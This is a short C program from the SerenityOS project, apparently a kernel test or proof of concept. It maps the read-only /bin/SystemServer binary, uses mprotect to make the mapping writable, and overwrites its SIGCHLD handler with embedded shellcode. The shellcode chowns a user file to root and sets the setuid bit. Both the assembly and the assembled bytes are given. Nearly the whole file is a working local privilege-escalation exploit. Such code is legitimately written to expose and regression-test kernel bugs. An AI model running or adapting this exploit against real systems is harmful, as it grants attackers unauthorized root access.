/*
 * Copyright (c) 2018-2020, the SerenityOS developers.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <AK/Types.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main()
{
    int fd = open("/bin/SystemServer", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    u8* ptr = (u8*)mmap(nullptr, 16384, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    if (mprotect(ptr, 16384, PROT_READ | PROT_WRITE) < 0) {
        perror("mprotect");
        return 1;
    }

    /*
     *
     * This payload replaces the start of sigchld_handler in the /bin/SystemServer file.
     * It does two things:
     *
     * chown ("/home/anon/own", 0, 0);
     * chmod ("/home/anon/own", 04755);
     *
     * In other words, it turns "/home/anon/own" into a SUID-root executable! :^)
     *
     */

#if 0
    [bits 32]
    [org 0x0804b111]
    jmp $+17
    path:
    db "/home/anon/own", 0
    mov eax, 79
    mov edx, path
    mov ecx, 0
    mov ebx, 0
    int 0x82
    mov eax, 67
    mov edx, path
    mov ecx, 15
    mov ebx, 2541
    int 0x82
    ret
#endif

    const u8 payload[] = {
        0xeb, 0x0f, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x61, 0x6e, 0x6f,
        0x6e, 0x2f, 0x6f, 0x77, 0x6e, 0x00, 0xb8, 0x4f, 0x00, 0x00, 0x00,
        0xba, 0x13, 0xb1, 0x04, 0x08, 0xb9, 0x00, 0x00, 0x00, 0x00, 0xbb,
        0x00, 0x00, 0x00, 0x00, 0xcd, 0x82, 0xb8, 0x43, 0x00, 0x00, 0x00,
        0xba, 0x13, 0xb1, 0x04, 0x08, 0xb9, 0x0f, 0x00, 0x00, 0x00, 0xbb,
        0xed, 0x09, 0x00, 0x00, 0xcd, 0x82, 0xc3
    };

    memcpy(&ptr[0x3111], payload, sizeof(payload));

    printf("ok\n");
    return 0;
}
